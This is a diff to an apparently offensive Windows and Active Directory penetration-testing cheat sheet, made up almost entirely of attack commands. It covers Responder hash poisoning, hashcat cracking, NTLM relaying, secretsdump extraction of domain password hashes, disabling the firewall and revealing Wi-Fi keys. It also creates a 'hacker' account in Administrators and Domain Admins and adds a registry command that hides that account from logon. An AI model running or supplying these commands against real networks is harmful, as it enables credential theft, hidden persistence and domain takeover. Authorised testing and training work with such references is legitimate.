@@ -10,6 +10,8 @@ msf > use auxiliary/scanner/smb/smb_enumusers
 
 enum4linux -a <target IP>
 
+nbtscan <target IP>
+
 rpcclient -U "" <target IP>
 Enter  's password: <return>
 rpcclient $> 
@@ -21,7 +23,7 @@ netshareenumall
 querydominfo
 getdompwinfo
 
-net use \\target IP\ipc$ "" /u:""             Windows
+net use \\target IP\ipc$ "" /u:""
 ------------------------------------------------------------------------------------------------------
 
 # CIFS Share Writeable By Everyone
@@ -42,12 +44,12 @@ proxychains smbclient '//10.0.0.10/c$' -U 'domain.local/username%password'
 
 # NetBIOS and SMB
 
-smbmap -H <target IP>                         Check for access to open shares
+smbmap -H <target IP>                             Check for access to open shares
 
-enum -G <target IP>                           Windows
+enum -G <target IP>
 enum -P <target IP>
 
-nbtenum -r <target IP>                        Windows
+nbtenum -r <target IP>
 nbtenum -q <target IP>
 
 nbtscan -r <target range>
@@ -60,21 +62,23 @@ smbclient //<target IP>/<share>
 
 # Active Directory
 
-- Use Responder to poison LLMNR/NBT-NS requests. This happens when you try to identify a host and DNS fails.
-     Capture NTLM/NTLNv2 hashes.
+- Use Responder to poison LLMNR/NBT-NS requests and capture NTLM/NTLNv2 hashes. This happens when you
+   try to identify a host and DNS fails.
+
 responder -A -I eth0
 responder -I eth0 -wrd
 
 - Crack the hash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
-netdiscover -i eth0 -r <CIDR>                 Host discovery
+- Relay NTLMv2 hashes if SMB Signing is disabled.
+cd /opt/CrackMapExec/cme/thirdparty/impacket/examples/
+ntlmrelayx.py
 
+- Host discovery and enumeration
+netdiscover -i eth0 -r <CIDR>
 nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
-
-- Relay NTLMv2 hashes. SMB Signing needs to be disabled.
-/opt/CrackMapExec/cme/thirdparty/impacket/examples/ntlmrelayx.py
-
+   Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
 ------------------------------------------------------------------------------------------------------
 
 # Domain controller
@@ -98,14 +102,14 @@ impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
 impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
 ------------------------------------------------------------------------------------------------------
 
-# Enumeration for a low level account
+# Enumeration using a low level account
 
 whoami
 hostname
 echo %username%
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"
 
-net users                                     Local users
+net users                                         Local users
 net user <current user>
 
 ipconfig /all
@@ -135,15 +139,15 @@ tasklist /m
 tasklist /svc
 tasklist /v
 
-dir c:\*.xls /s                               Show all Excel files
-dir c:\*.xlsx /s                              Show all Excel files
-dir c:\*.ppt /s                               Show all PowerPoint files
-dir c:\*.pptx /s                              Show all PowerPoint files
-dir c:\*.doc /s                               Show all Word docs
-dir c:\*.docx /s                              Show all Word docs
-dir c:\*.pdf /s                               Show all PDF files
+dir c:\*.xls /s                                   Show all Excel files
+dir c:\*.xlsx /s                                  Show all Excel files
+dir c:\*.ppt /s                                   Show all PowerPoint files
+dir c:\*.pptx /s                                  Show all PowerPoint files
+dir c:\*.doc /s                                   Show all Word docs
+dir c:\*.docx /s                                  Show all Word docs
+dir c:\*.pdf /s                                   Show all PDF files
 
-dir /s /p *password*                          Show all filenames that include 'password'
+dir /s /p *password*                              Show all filenames that include 'password'
 ------------------------------------------------------------------------------------------------------
 
 # Firewall
@@ -152,7 +156,7 @@ netsh firewall show state
 netsh firewall show config
 
 netsh firewall add portopening TCP 3389 RDP
-netsh firewall set opmode disable             Disable firewall
+netsh firewall set opmode disable                 Disable firewall
 
 netsh wlan show interfaces
 netsh wlan show drivers
@@ -162,37 +166,39 @@ netsh wlan show profiles name="name"
 show profiles name="name" key=clear
 ------------------------------------------------------------------------------------------------------
 
-# net commands
+# User Accounts
 
 - Local
-net users                                     Local users
+net users                                         Local users
 net user <current user>
-net accounts                                  Local password policy
+net accounts                                      Local password policy
 net config workstation
-net localgroup                                Local Security Groups
-net localgroup Administrators                 Users in the local Administrators Security Group
+net localgroup                                    Local Security Groups
+net localgroup Administrators                     Users in the local Administrators Security Group
 net localgroup "Remote Desktop Users"
 net share
-net user <user> <password> /add               Add a local user
+net user <user> <password> /add                   Add a local user
 
-net user hacker /domain                       Info on domain user
-net view                                      Computers in the users domain and other domains
-net view /domain                              Computers in other domain
+net user hacker /domain                           Info on domain user
+net view                                          Computers in the users domain and other domains
+net view /domain                                  Computers in other domain
 
 net user hacker abc123 /add
 net localgroup Administrators hacker /add
 
-- Domain
-net accounts /domain                          Domain password policy
-net group “Domain Admins" /domain             Show domain admin
-net group “Domain Users" /domain              Show domain users
-net user /domain                              Show domain users
-net localgroup Administrators /domain         Users in the domain Administrators Security Group
-net localgroup /domain                        Domain Security Groups
+- Hide a newly created account
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v hacker /d 0 /f
 
-net user hacker password /add /domain
-net group "Enterprise Admins" hacker /add /domain
-net groups "Enterprise Admins" /domain
+- Domain
+net accounts /domain                              Domain password policy
+net group “Domain Admins" /domain                 Show domain admin
+net group “Domain Users" /domain                  Show domain users
+net user /domain                                  Show domain users
+net localgroup Administrators /domain             Users in the domain Administrators Security Group
+net localgroup /domain                            Domain Security Groups
+
+net user hacker password /add /domain             Add a user to the domain
+net group "Domain Admins" hacker /add /domain     Add a user to a specific Security Group on the domain
 ------------------------------------------------------------------------------------------------------
 
 # Open RDP in the firewall, start the service and login
@@ -219,6 +225,6 @@ systeminfo.exe > systeminfo.txt               Run this on the Windows target and
 
 DumpSec
 
-nltest /dclist:<domain>                       Locate the domain controller
-global.exe "domain admins" \\dc               Show members of domain groups
+nltest /dclist:<domain>                           Locate the domain controller
+global.exe "domain admins" \\dc                   Show members of domain groups
 
